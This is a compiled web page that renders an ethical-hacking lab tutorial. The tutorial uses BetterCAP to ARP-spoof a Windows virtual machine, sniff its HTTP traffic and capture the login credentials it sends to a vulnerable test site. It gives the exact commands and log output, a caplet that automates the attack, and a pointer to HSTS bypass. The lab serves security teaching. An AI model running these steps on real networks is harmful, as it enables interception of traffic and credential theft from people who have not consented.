import{_ as t,c as a,a1 as s,o as n}from"./chunks/framework.BDxlaA_J.js";const g=JSON.parse('{"title":"MITM attack using BetterCAP","description":"","frontmatter":{},"headers":[],"relativePath":"categories/ethical-hacking-labs/7-sniffing/1-MITM-with-Bettercap.md","filePath":"categories/ethical-hacking-labs/7-sniffing/1-MITM-with-Bettercap.md"}'),o={name:"categories/ethical-hacking-labs/7-sniffing/1-MITM-with-Bettercap.md"};function r(i,e,l,p,c,h){return n(),a("div",null,e[0]||(e[0]=[s(`<h1 id="mitm-attack-using-bettercap" tabindex="-1">MITM attack using BetterCAP <a class="header-anchor" href="#mitm-attack-using-bettercap" aria-label="Permalink to &quot;MITM attack using BetterCAP&quot;">​</a></h1><p align="center"><img width="30%" src="https://raw.githubusercontent.com/bettercap/media/master/logo.png"></p> BetterCAP is a powerful, easily extensible and portable framework written in Go which aims to offer to security researchers, red teamers and reverse engineers an easy to use, all-in-one solution with all the features they might possibly need for performing reconnaissance and attacking WiFi networks, Bluetooth Low Energy devices, wireless HID devices and Ethernet networks. <p>_Bettercap Official Documentation: <a href="https://www.bettercap.org/intro/_" target="_blank" rel="noreferrer">https://www.bettercap.org/intro/_</a></p><p>_Official Repo: <a href="https://github.com/bettercap/bettercap_" target="_blank" rel="noreferrer">https://github.com/bettercap/bettercap_</a></p><h3 id="mitm-attack-man-in-the-middle-attack" tabindex="-1">MITM Attack <em>(Man-in-the-Middle Attack)</em> <a class="header-anchor" href="#mitm-attack-man-in-the-middle-attack" aria-label="Permalink to &quot;MITM Attack _(Man-in-the-Middle Attack)_&quot;">​</a></h3><p>An MITM is aform of active eavesdropping in which the attacker makes independent connections with the victims and relays messages between them, making them believe that they are talking directly to each other over a private connection, when in fact the entire conversation is controlled by the attacker.</p><p>MITM attacks come in many variations.</p><h3 id="objectives" tabindex="-1">Objectives <a class="header-anchor" href="#objectives" aria-label="Permalink to &quot;Objectives&quot;">​</a></h3><ul><li>Sniff network traffic and perform ARP poisoning.</li><li>Launch Man-in-the-Middle attack.</li><li>Sniff network traffic for passwords.</li></ul><h3 id="requisites" tabindex="-1">Requisites <a class="header-anchor" href="#requisites" aria-label="Permalink to &quot;Requisites&quot;">​</a></h3><ul><li>Kali Linux virtual machine.</li><li>Any Windows virtual machine (7, 8, 10 or Server).</li></ul><hr><h2 id="install-bettercap" tabindex="-1">Install BetterCAP <a class="header-anchor" href="#install-bettercap" aria-label="Permalink to &quot;Install BetterCAP&quot;">​</a></h2><p>Launch your Kali Linux, open a new Terminal window and type the following commands:</p><p><code>apt-get update</code><code>apt-get install bettercap</code></p><h2 id="bettercap-modules" tabindex="-1">BetterCAP modules <a class="header-anchor" href="#bettercap-modules" aria-label="Permalink to &quot;BetterCAP modules&quot;">​</a></h2><p>To launch the program, type <code>bettercap</code> and specify your current network interface:</p><p><code>bettercap -iface eth0</code></p><p>Type <strong>help</strong> to list all modules available:</p><p><code>help</code></p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/7e4aa214016257e51ca5c19231801f0554de6134/bettercap-1.png" alt="modules"></p><p>The module <strong>events.stream</strong> is <strong>running</strong> by default, this module is enabled by default and is responsible for reporting events (logs, new hosts being found, etc) generated by other modules during the interactive session. Moreover, it can be used to programmatically execute commands when specific events occur.</p><p><strong>To perform a MITM attack we will use these modules below:</strong></p><table tabindex="0"><thead><tr><th>module</th><th>about</th></tr></thead><tbody><tr><td><code>net.probe</code></td><td>When activated, this module will send different types of probe packets to each IP in the current subnet in order for the net.recon module to detect them. <a href="https://www.bettercap.org/modules/ethernet/net.probe/" target="_blank" rel="noreferrer">[+]</a></td></tr><tr><td><code>net.recon</code></td><td>This module is responsible for periodically reading the system ARP table in order to detect new hosts on the network. <a href="https://www.bettercap.org/modules/ethernet/net.recon/" target="_blank" rel="noreferrer">[+]</a></td></tr><tr><td><code>arp.spoof</code></td><td>This module keeps spoofing selected hosts on the network using crafted ARP packets in order to perform a MITM attack. <a href="https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/" target="_blank" rel="noreferrer">[+]</a></td></tr><tr><td><code>net.sniff</code></td><td>This module is a network packet sniffer and fuzzer supporting both BPF syntax and regular expressions for filtering. It is also able to dissect several major protocols in order to harvest credentials. <a href="https://www.bettercap.org/modules/ethernet/net.sniff/" target="_blank" rel="noreferrer">[+]</a></td></tr></tbody></table><p><em>You can type <code>help</code> following with the <code>module</code> name to grab some details about:</em><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/c2be3479c96a94b3d2c042e8c8c4df20a4a06b57/bettercap-2.png" alt="b2"></p><h2 id="setting-up-the-modules-to-perform-an-arp-spoofing" tabindex="-1">Setting up the Modules to perform an ARP spoofing <a class="header-anchor" href="#setting-up-the-modules-to-perform-an-arp-spoofing" aria-label="Permalink to &quot;Setting up the Modules to perform an ARP spoofing&quot;">​</a></h2><ol><li>Start the <strong>prober</strong> module to send different types of probe packets to each IP in the current subnet in order for the <strong>net.recon</strong> module to detect them. <em>(Note: the prober module may start automatically the net.recon module).</em><code>net.probe on</code></li></ol><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>10.0.2.0/24 &gt; 10.0.2.42  » net.probe on</span></span>
<span class="line"><span>10.0.2.0/24 &gt; 10.0.2.42  » [11:43:32] [sys.log] [inf] net.probe starting net.recon as a requirement for net.probe</span></span>
<span class="line"><span>10.0.2.0/24 &gt; 10.0.2.42  » [11:43:32] [endpoint.new] endpoint 10.0.2.3 detected as 07:00:27:11:6c:7d .</span></span>
<span class="line"><span>10.0.2.0/24 &gt; 10.0.2.42  » [11:43:33] [endpoint.new] endpoint 10.0.2.43 detected as 07:00:27:81:d6:f2 .</span></span></code></pre></div><p>In my lab, the <strong>10.0.2.43</strong> is my Windows virtual machine, this may differ from your virtual environment.</p><ol start="2"><li>Start network hosts discovery: <code>net.recon on</code></li></ol><ul><li>Note: you can type <code>net.show</code> to view all the connected clients viewing the IP addresses and MAC addresses.</li></ul><ol start="3"><li><p>Set the <strong>arp.spoof</strong> module option <strong>fullduplex</strong> to <strong>true</strong>. When you set to true, both the targets and the gateway will be attacked, otherwise only the target (if the router has ARP spoofing protections in place this will make the attack fail). <code>set arp.spoof.fullduplex true</code></p></li><li><p>Specify the target to spoof. <em>(A comma separated list of MAC addresses, IP addresses, IP ranges or aliases to spoof).</em><code>set arp.spoof.targets 10.0.2.43</code></p></li><li><p>Start ARP spoofer: <code>arp.spoof on</code></p></li></ol><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>10.0.2.0/24 &gt; 10.0.2.42  » [12:03:58] [sys.log] [inf] arp.spoof enabling forwarding</span></span>
<span class="line"><span>10.0.2.0/24 &gt; 10.0.2.42  » [12:03:58] [sys.log] [war] arp.spoof full duplex spoofing enabled, if the router has ARP spoofing mechanisms, the attack will fail.</span></span>
<span class="line"><span>10.0.2.0/24 &gt; 10.0.2.42  » [12:03:58] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.</span></span></code></pre></div><ol start="6"><li><p>Start the packet sniffer: <code>net.sniff on</code></p></li><li><p>Type <code>help</code> to list the modules running: <img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/9b7efcd559aef438cbbf1aa8a14ceeced52b19d5/bettercap-3.png" alt="modules2"></p></li></ol><h3 id="the-arp-spoofing" tabindex="-1">The ARP spoofing <a class="header-anchor" href="#the-arp-spoofing" aria-label="Permalink to &quot;The ARP spoofing&quot;">​</a></h3><p>Bettercap is fooling the <strong>router</strong> and the <strong>target machine(Windows)</strong>, putting the <strong>attacker machine(Kali)</strong> on the middle of the connection.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/913307b303fe83f04dd10b2c9760fe370e95a1e6/arp-4.png" alt="arp"></p><p><strong>On my Windows</strong> machine, I will use the <strong>arp table command</strong> to see what is going on:</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/af2872eca1b4d3ecf5c2b3979d8ffd33d1652186/arp-5.png" alt="arp5"></p><p>As you can see, the Windows machine &#39;thinks&#39; the <strong>router</strong> MAC address is the same as the <strong>Kali</strong> since the ARP table is spoofed.</p><h3 id="generate-some-generic-traffic-on-the-target-machine" tabindex="-1">Generate some generic traffic on the Target machine. <a class="header-anchor" href="#generate-some-generic-traffic-on-the-target-machine" aria-label="Permalink to &quot;Generate some generic traffic on the Target machine.&quot;">​</a></h3><ol><li>Log into your Windows virtual machine.</li><li>Launch the browser and type the URL: <a href="http://testhtml5.vulnweb.com" target="_blank" rel="noreferrer">http://testhtml5.vulnweb.com</a></li><li>Login into this vulnerable-testing-website with sample credentials: <strong>user: admin | password: password</strong>.</li></ol><h3 id="grabbing-and-analyzing-every-request" tabindex="-1">Grabbing and analyzing every request <a class="header-anchor" href="#grabbing-and-analyzing-every-request" aria-label="Permalink to &quot;Grabbing and analyzing every request&quot;">​</a></h3><ul><li>Back to your Bettercap on Kali machine and analyze all the requests sent from the Windows.</li></ul><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/e27e815cbb390ab5c7d5928fe897f49a71cf73ce/bettercap-7.png" alt="b7"></p><p>As you can see, we captured the credentials sent to the website. Anything that the target machine sent and received will be captured by Kali Linux machine.</p><p><em><strong>Note</strong>: this technique works on HTTP websites not HTTPS. To perform such action you need to bypass the HSTS (HTTP Strict Transport Security). You can perform this technique using Bettercap and <a href="https://github.com/bettercap/caplets/tree/master/hstshijack" target="_blank" rel="noreferrer">hstshijack</a> caplet.</em></p><h2 id="automate-bettercap-using-caplets" tabindex="-1">Automate BetterCAP using Caplets <a class="header-anchor" href="#automate-bettercap-using-caplets" aria-label="Permalink to &quot;Automate BetterCAP using Caplets&quot;">​</a></h2><p>To be more efficient on your work, you can automate the modules setup part by creating a simple <strong>Caplet file</strong>(file.cap) and adding the commands per line.</p><ol><li><p>Create the caplet: <code>touch spoof.cap</code></p></li><li><p>Add the commands and save it : <code>nano spoof.cap</code></p></li></ol><div class="language-sh vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sh</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">net.probe</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> on</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">set</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> arp.spoof.fullduplex</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> true</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> </span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">set</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> arp.spoof.targets</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 10.0.2.5</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">arp.spoof</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> on</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">set</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> net.sniff.local</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> true</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">net.sniff</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> on</span></span></code></pre></div><p>As you can see is the same commands in order that you used previously.</p><ol start="3"><li>Start the <strong>Bettercap</strong> using the spoof <strong>Caplet</strong> that you created: <code>bettercap -iface eth0 -caplet spoof.cap</code></li></ol>`,54)]))}const u=t(o,[["render",r]]);export{g as __pageData,u as default};
